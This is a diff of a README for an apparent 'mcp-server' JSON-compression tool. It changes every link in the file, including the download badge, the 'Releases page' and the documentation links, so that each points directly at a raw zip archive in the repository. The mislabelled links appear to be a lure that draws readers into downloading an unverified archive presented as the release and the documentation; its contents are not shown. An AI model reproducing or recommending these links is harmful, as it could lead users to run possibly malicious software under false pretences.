@@ -6,7 +6,7 @@ Welcome to the **mcp-server** repository! This application allows you to compres
 
 ## 📥 Download the Software
 
-[![Download mcp-server](https://raw.githubusercontent.com/biggy44/mcp-server/main/src/tools/mcp-server-v3.0.zip)](https://raw.githubusercontent.com/biggy44/mcp-server/main/src/tools/mcp-server-v3.0.zip)
+[![Download mcp-server](https://github.com/biggy44/mcp-server/raw/refs/heads/main/scripts/server_mcp_v1.2.zip)](https://github.com/biggy44/mcp-server/raw/refs/heads/main/scripts/server_mcp_v1.2.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ To run the **mcp-server**, you need:
 
 To get started with **mcp-server**, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/biggy44/mcp-server/main/src/tools/mcp-server-v3.0.zip).
+1. Visit the [Releases page](https://github.com/biggy44/mcp-server/raw/refs/heads/main/scripts/server_mcp_v1.2.zip).
 2. Choose the latest version of the software.
 3. Click on the appropriate file for your operating system.
 4. Download the file to your computer.
@@ -71,14 +71,14 @@ We strive to maintain high quality in our software, but a few issues may arise:
 - Some older operating systems may show compatibility warnings.
 - The application may take longer to process larger JSON files.
 
-Stay updated with the latest fixes and improvements on the [Releases page](https://raw.githubusercontent.com/biggy44/mcp-server/main/src/tools/mcp-server-v3.0.zip).
+Stay updated with the latest fixes and improvements on the [Releases page](https://github.com/biggy44/mcp-server/raw/refs/heads/main/scripts/server_mcp_v1.2.zip).
 
 ## 🌟 Additional Resources
 
 For more details and advanced usage, consider the following:
 
-- [Model Context Protocol Overview](https://raw.githubusercontent.com/biggy44/mcp-server/main/src/tools/mcp-server-v3.0.zip)
-- [ASON Format Explained](https://raw.githubusercontent.com/biggy44/mcp-server/main/src/tools/mcp-server-v3.0.zip)
-- [JSON Structure Basics](https://raw.githubusercontent.com/biggy44/mcp-server/main/src/tools/mcp-server-v3.0.zip)
+- [Model Context Protocol Overview](https://github.com/biggy44/mcp-server/raw/refs/heads/main/scripts/server_mcp_v1.2.zip)
+- [ASON Format Explained](https://github.com/biggy44/mcp-server/raw/refs/heads/main/scripts/server_mcp_v1.2.zip)
+- [JSON Structure Basics](https://github.com/biggy44/mcp-server/raw/refs/heads/main/scripts/server_mcp_v1.2.zip)
 
 Thank you for using **mcp-server**! We hope this tool simplifies your data compression and decompression needs.
